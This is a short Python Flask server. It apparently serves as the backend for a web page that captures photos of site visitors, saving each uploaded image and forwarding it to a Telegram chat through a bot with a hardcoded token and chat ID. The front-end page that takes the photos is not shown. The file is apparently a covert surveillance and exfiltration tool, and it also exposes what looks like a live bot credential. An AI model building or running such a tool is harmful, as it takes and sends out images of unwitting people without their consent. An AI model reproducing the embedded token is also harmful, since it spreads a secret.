from flask import Flask, request, send_from_directory
import base64
import requests

app = Flask(__name__, static_folder='static')

# Telegram config
BOT_TOKEN = "8100295998:AAECJtVSO4_kjZmmZKBTJwEtiQlQW4CkBco"
CHAT_ID = "6436339187"

@app.route('/')
def serve_html():
    return send_from_directory('static', 'index.html')

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    data = request.json['image']
    header, encoded = data.split(",", 1)
    binary_data = base64.b64decode(encoded)

    # Save to file
    filename = 'visitor.png'
    with open(filename, 'wb') as f:
        f.write(binary_data)

    # Send to Telegram
    with open(filename, 'rb') as f:
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
            data={'chat_id': CHAT_ID},
            files={'photo': f}
        )

    return "OK"

if __name__ == '__main__':
    app.run(debug=True)